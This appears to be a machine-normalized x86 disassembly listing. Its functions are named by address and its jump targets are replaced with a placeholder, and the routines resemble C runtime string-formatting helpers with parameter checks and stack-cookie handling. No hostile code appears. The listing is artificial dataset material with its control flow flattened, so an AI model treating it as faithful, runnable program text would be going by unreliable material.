lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x10 ]
call sub_418158
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_4181d9
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x10 ]
call sub_418090
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_418232
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x10 ]
call sub_4180b8
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_41828b
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x10 ]
call sub_418130
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_4182e4
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x10 ]
call sub_418108
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_41833d
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x10 ]
call sub_4180e0
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_418396
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x18 ]
test edi edi
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov esp ebp
pop ebp
retn
call sub_430f56
mov [ eax ] 0x16
mov ebx [ ebp + 0x14 ]
test ebx ebx
je r-xdata
cmp [ ebp + 0x14 ] esi
jne r-xdata
call sub_430f56
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
cmp ebx edi
jbe r-xdata
xor eax eax
jmp r-xdata
mov eax [ eax ]
push ebx
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
call sub_4185a2
add esp 0x1c
mov [ esi + ebx - 0x1 ] 0x0
cmp eax 0xfffffffe
jne r-xdata
mov ebx [ eax ]
lea eax [ edi + 0x1 ]
push eax
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4185a2
add esp 0x1c
cmp eax 0xfffffffe
jne r-xdata
pop edi
pop esi
pop ebx
test eax eax
jns r-xdata
cmp edi 0xffffffff
jne r-xdata
call sub_430f56
cmp [ eax ] 0x22
jne r-xdata
mov [ esi ] 0x0
cmp eax 0xfffffffe
jne r-xdata
call sub_430f56
cmp [ eax ] 0x22
jne r-xdata
or eax 0xffffffff
call sub_430f56
mov [ eax ] ebx
jmp r-xdata
call sub_430f56
mov [ eax ] 0x22
jmp r-xdata
call sub_430f56
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
jmp r-xdata
call sub_430e30
sub_41849a
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x18 ]
test edi edi
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov esp ebp
pop ebp
retn
call sub_430f56
mov [ eax ] 0x16
mov ebx [ ebp + 0x14 ]
test ebx ebx
je r-xdata
cmp [ ebp + 0x14 ] esi
jne r-xdata
call sub_430f56
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
cmp ebx edi
jbe r-xdata
xor eax eax
jmp r-xdata
mov eax [ eax ]
push ebx
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
call sub_41871e
xor ecx ecx
add esp 0x1c
mov [ esi + ebx * 2 - 0x2 ] cx
cmp eax 0xfffffffe
jne r-xdata
mov ebx [ eax ]
lea eax [ edi + 0x1 ]
push eax
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41871e
add esp 0x1c
cmp eax 0xfffffffe
jne r-xdata
pop edi
pop esi
pop ebx
test eax eax
jns r-xdata
cmp edi 0xffffffff
jne r-xdata
call sub_430f56
cmp [ eax ] 0x22
jne r-xdata
xor ecx ecx
mov [ esi ] cx
cmp eax 0xfffffffe
jne r-xdata
call sub_430f56
cmp [ eax ] 0x22
jne r-xdata
or eax 0xffffffff
call sub_430f56
mov [ eax ] ebx
jmp r-xdata
call sub_430f56
mov [ eax ] 0x22
jmp r-xdata
call sub_430f56
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
jmp r-xdata
call sub_430e30
sub_4185a2
mov edi edi
push ebp
mov ebp esp
sub esp 0x484
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x18 ] 0x0
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x460 ] eax
jne r-xdata
test ebx ebx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x484 ]
call sub_41cbf0
mov ecx [ ebp + 0x8 ]
lea edi [ ebp - 0x470 ]
xor eax eax
xor edx edx
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
mov edi [ ebp - 0x460 ]
and eax 0x2
mov [ ebp - 0x474 ] eax
or eax edx
mov [ ebp - 0x470 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x468 ] edx
jne r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov [ ebp - 0x464 ] 0x1
mov [ ebp - 0x464 ] dl
test edi edi
jne r-xdata
lea ecx [ ebp - 0x41c ]
call sub_41cdad
cmp [ ebp - 0x478 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
and eax 0x1
or eax ecx
je r-xdata
push [ ebp + 0x20 ]
lea eax [ ebp - 0x470 ]
mov [ ebp - 0x460 ] eax
lea eax [ ebp - 0x480 ]
push eax
push [ ebp + 0x18 ]
lea eax [ ebp - 0x460 ]
push [ ebp + 0xc ]
push ecx
push eax
lea ecx [ ebp - 0x45c ]
call sub_41c9e5
lea ecx [ ebp - 0x45c ]
call sub_41e7c6
mov esi eax
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov ecx [ ebp - 0x484 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax [ ebp - 0x474 ]
or eax ecx
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
or esi 0xffffffff
jmp r-xdata
test esi esi
jns r-xdata
mov [ edi + eax ] cl
test esi esi
js r-xdata
push 0xfffffffe
pop esi
mov eax [ ebp - 0x468 ]
cmp eax ebx
je r-xdata
mov [ edi ] cl
jmp r-xdata
cmp esi ebx
jbe r-xdata
mov [ edi + ebx - 0x1 ] cl
jmp r-xdata
jmp r-xdata
sub_41871e
mov edi edi
push ebp
mov ebp esp
sub esp 0x484
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x18 ] 0x0
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x460 ] eax
jne r-xdata
test ebx ebx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x484 ]
call sub_41cbf0
mov ecx [ ebp + 0x8 ]
lea edi [ ebp - 0x470 ]
xor eax eax
xor edx edx
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
mov edi [ ebp - 0x460 ]
and eax 0x2
mov [ ebp - 0x474 ] eax
or eax edx
mov [ ebp - 0x470 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x468 ] edx
jne r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov [ ebp - 0x464 ] 0x1
mov [ ebp - 0x464 ] dl
test edi edi
jne r-xdata
lea ecx [ ebp - 0x41c ]
call sub_41cdad
cmp [ ebp - 0x478 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
and eax 0x1
or eax 0x0
je r-xdata
push [ ebp + 0x20 ]
lea eax [ ebp - 0x470 ]
mov [ ebp - 0x460 ] eax
lea eax [ ebp - 0x480 ]
push eax
push [ ebp + 0x18 ]
lea eax [ ebp - 0x460 ]
push [ ebp + 0xc ]
push ecx
push eax
lea ecx [ ebp - 0x45c ]
call sub_41cb17
lea ecx [ ebp - 0x45c ]
call sub_41ef16
mov esi eax
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov ecx [ ebp - 0x484 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax [ ebp - 0x474 ]
or eax 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
or esi 0xffffffff
jmp r-xdata
test esi esi
jns r-xdata
xor ecx ecx
mov [ edi + eax * 2 ] cx
test esi esi
js r-xdata
push 0xfffffffe
pop esi
mov eax [ ebp - 0x468 ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ edi ] ax
jmp r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
mov [ edi + ebx * 2 - 0x2 ] ax
jmp r-xdata
jmp r-xdata
sub_4188a3
mov edi edi
push ebp
mov ebp esp
sub esp 0xaf0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xab8 ] eax
test esi esi
jne r-xdata
test ebx ebx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xaf0 ]
call sub_41cbf0
mov ecx [ ebp + 0x8 ]
lea edi [ ebp - 0xac8 ]
xor eax eax
xor edx edx
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
mov edi [ ebp - 0xab8 ]
and eax 0x2
mov [ ebp - 0xacc ] eax
or eax edx
mov [ ebp - 0xac8 ] edi
mov [ ebp - 0xac4 ] ebx
mov [ ebp - 0xac0 ] edx
jne r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov [ ebp - 0xabc ] 0x1
mov [ ebp - 0xabc ] dl
test edi edi
jne r-xdata
lea ecx [ ebp - 0xa74 ]
call sub_41cdad
cmp [ ebp - 0xae4 ] 0x0
pop edi
je r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
and eax 0x1
or eax ecx
je r-xdata
lea eax [ ebp - 0xac8 ]
mov [ ebp - 0xae0 ] ecx
mov [ ebp - 0xad8 ] eax
lea ecx [ ebp - 0xab4 ]
mov eax [ ebp + 0x20 ]
mov [ ebp - 0xab8 ] eax
lea eax [ ebp - 0xaec ]
mov [ ebp - 0xad4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xadc ] eax
lea eax [ ebp - 0xab8 ]
push eax
lea eax [ ebp - 0xad4 ]
mov [ ebp - 0xad0 ] esi
push eax
lea eax [ ebp - 0xad0 ]
push eax
lea eax [ ebp - 0xae0 ]
push eax
lea eax [ ebp - 0xad8 ]
push eax
call sub_417d8d
call sub_430f56
lea ecx [ ebp - 0xab4 ]
mov [ ebp - 0xaa8 ] eax
call sub_41e8ee
mov esi eax
test edi edi
je r-xdata
mov eax esi
mov ecx [ ebp - 0xaf0 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax [ ebp - 0xacc ]
or eax ecx
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0xac0 ]
cmp eax ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0xac0 ]
cmp eax ebx
jne r-xdata
or esi 0xffffffff
jmp r-xdata
test esi esi
jns r-xdata
mov [ edi + eax ] cl
test esi esi
js r-xdata
push 0xfffffffe
pop esi
mov eax [ ebp - 0xac0 ]
cmp eax ebx
je r-xdata
mov [ edi ] cl
jmp r-xdata
cmp esi ebx
jbe r-xdata
mov [ edi + ebx - 0x1 ] cl
jmp r-xdata
jmp r-xdata
sub_418a60
mov edi edi
push ebp
mov ebp esp
sub esp 0xaf0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xab8 ] eax
test esi esi
jne r-xdata
test ebx ebx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xaf0 ]
call sub_41cbf0
mov ecx [ ebp + 0x8 ]
lea edi [ ebp - 0xac8 ]
xor eax eax
xor edx edx
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
mov edi [ ebp - 0xab8 ]
and eax 0x2
mov [ ebp - 0xacc ] eax
or eax edx
mov [ ebp - 0xac8 ] edi
mov [ ebp - 0xac4 ] ebx
mov [ ebp - 0xac0 ] edx
jne r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov [ ebp - 0xabc ] 0x1
mov [ ebp - 0xabc ] dl
test edi edi
jne r-xdata
lea ecx [ ebp - 0xa74 ]
call sub_41cdad
cmp [ ebp - 0xae4 ] 0x0
pop edi
je r-xdata
mov eax [ ebp + 0x8 ]
and eax 0x1
or eax 0x0
je r-xdata
lea eax [ ebp - 0xac8 ]
mov [ ebp - 0xae0 ] ecx
mov [ ebp - 0xad8 ] eax
lea ecx [ ebp - 0xab4 ]
mov eax [ ebp + 0x20 ]
mov [ ebp - 0xab8 ] eax
lea eax [ ebp - 0xaec ]
mov [ ebp - 0xad4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xadc ] eax
lea eax [ ebp - 0xab8 ]
push eax
lea eax [ ebp - 0xad4 ]
mov [ ebp - 0xad0 ] esi
push eax
lea eax [ ebp - 0xad0 ]
push eax
lea eax [ ebp - 0xae0 ]
push eax
lea eax [ ebp - 0xad8 ]
push eax
call sub_417e2d
call sub_430f56
lea ecx [ ebp - 0xab4 ]
mov [ ebp - 0xaa8 ] eax
call sub_41f046
mov esi eax
test edi edi
je r-xdata
mov eax esi
mov ecx [ ebp - 0xaf0 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax [ ebp - 0xacc ]
or eax 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0xac0 ]
cmp eax ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0xac0 ]
cmp eax ebx
jne r-xdata
or esi 0xffffffff
jmp r-xdata
test esi esi
jns r-xdata
xor ecx ecx
mov [ edi + eax * 2 ] cx
test esi esi
js r-xdata
push 0xfffffffe
pop esi
mov eax [ ebp - 0xac0 ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ edi ] ax
jmp r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
mov [ edi + ebx * 2 - 0x2 ] ax
jmp r-xdata
jmp r-xdata
sub_418c26
mov edi edi
push ebp
mov ebp esp
sub esp 0x484
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x18 ] 0x0
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x460 ] eax
jne r-xdata
test ebx ebx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x484 ]
call sub_41cbf0
mov ecx [ ebp + 0x8 ]
lea edi [ ebp - 0x470 ]
xor eax eax
xor edx edx
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
mov edi [ ebp - 0x460 ]
and eax 0x2
mov [ ebp - 0x474 ] eax
or eax edx
mov [ ebp - 0x470 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x468 ] edx
jne r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov [ ebp - 0x464 ] 0x1
mov [ ebp - 0x464 ] dl
test edi edi
jne r-xdata
lea ecx [ ebp - 0x41c ]
call sub_41cdad
cmp [ ebp - 0x478 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
and eax 0x1
or eax ecx
je r-xdata
push [ ebp + 0x20 ]
lea eax [ ebp - 0x470 ]
mov [ ebp - 0x460 ] eax
lea eax [ ebp - 0x480 ]
push eax
push [ ebp + 0x18 ]
lea eax [ ebp - 0x460 ]
push [ ebp + 0xc ]
push ecx
push eax
lea ecx [ ebp - 0x45c ]
call sub_41ca49
lea ecx [ ebp - 0x45c ]
call sub_41ea4a
mov esi eax
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov ecx [ ebp - 0x484 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax [ ebp - 0x474 ]
or eax ecx
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
or esi 0xffffffff
jmp r-xdata
test esi esi
jns r-xdata
mov [ edi + eax ] cl
test esi esi
js r-xdata
push 0xfffffffe
pop esi
mov eax [ ebp - 0x468 ]
cmp eax ebx
je r-xdata
mov [ edi ] cl
jmp r-xdata
cmp esi ebx
jbe r-xdata
mov [ edi + ebx - 0x1 ] cl
jmp r-xdata
jmp r-xdata
sub_418da2
mov edi edi
push ebp
mov ebp esp
sub esp 0x484
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x18 ] 0x0
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x460 ] eax
jne r-xdata
test ebx ebx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x484 ]
call sub_41cbf0
mov ecx [ ebp + 0x8 ]
lea edi [ ebp - 0x470 ]
xor eax eax
xor edx edx
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
mov edi [ ebp - 0x460 ]
and eax 0x2
mov [ ebp - 0x474 ] eax
or eax edx
mov [ ebp - 0x470 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x468 ] edx
jne r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov [ ebp - 0x464 ] 0x1
mov [ ebp - 0x464 ] dl
test edi edi
jne r-xdata
lea ecx [ ebp - 0x41c ]
call sub_41cdad
cmp [ ebp - 0x478 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
and eax 0x1
or eax 0x0
je r-xdata
push [ ebp + 0x20 ]
lea eax [ ebp - 0x470 ]
mov [ ebp - 0x460 ] eax
lea eax [ ebp - 0x480 ]
push eax
push [ ebp + 0x18 ]
lea eax [ ebp - 0x460 ]
push [ ebp + 0xc ]
push ecx
push eax
lea ecx [ ebp - 0x45c ]
call sub_41cb7b
lea ecx [ ebp - 0x45c ]
call sub_41f1a6
mov esi eax
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov ecx [ ebp - 0x484 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax [ ebp - 0x474 ]
or eax 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
or esi 0xffffffff
jmp r-xdata
test esi esi
jns r-xdata
xor ecx ecx
mov [ edi + eax * 2 ] cx
test esi esi
js r-xdata
push 0xfffffffe
pop esi
mov eax [ ebp - 0x468 ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ edi ] ax
jmp r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
mov [ edi + ebx * 2 - 0x2 ] ax
jmp r-xdata
jmp r-xdata
sub_418f27
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
pop ebp
retn
call sub_430f56
mov [ eax ] 0x16
cmp [ ebp + 0x14 ] 0x0
jbe r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4185a2
add esp 0x1c
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
call sub_430f56
mov [ eax ] 0x22
jmp r-xdata
call sub_430e30
or eax 0xffffffff
sub_418f9f
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
pop ebp
retn
call sub_430f56
mov [ eax ] 0x16
cmp [ ebp + 0x14 ] 0x0
jbe r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41871e
add esp 0x1c
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
xor ecx ecx
mov [ esi ] cx
pop esi
pop ebp
retn
call sub_430f56
mov [ eax ] 0x22
jmp r-xdata
call sub_430e30
or eax 0xffffffff
sub_41904b
mov edi edi
push ebp
mov ebp esp
push ecx
or eax 0xffffffff
xor edx edx
push esi
mov esi [ ebp + 0x8 ]
div esi
push edi
and eax 0xfffffffe
mov edi ecx
cmp eax 0x2
jae r-xdata
push ebx
xor ebx ebx
add esi esi
cmp [ edi + 0x404 ] ebx
jne r-xdata
call sub_430f56
mov [ eax ] 0xc
xor al al
jmp r-xdata
cmp esi [ edi + 0x400 ]
ja r-xdata
cmp esi 0x400
jbe r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_42d3eb
mov [ ebp - 0x4 ] eax
pop ecx
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
push eax
call sub_42d3b1
pop ecx
mov al bl
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ edi + 0x404 ]
call sub_41cdc7
mov eax [ ebp - 0x4 ]
mov bl 0x1
mov [ edi + 0x400 ] esi
pop ebx
sub_4190d1
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movsx eax [ ecx - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movsx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427956
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_419150
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movsx eax [ ecx - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
movsx eax [ eax ]
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279a1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cdq
mov [ ecx ] eax
mov al 0x1
mov [ ecx + 0x4 ] edx
jmp r-xdata
sub_4191cf
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
movsx eax [ ecx - 0x4 ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
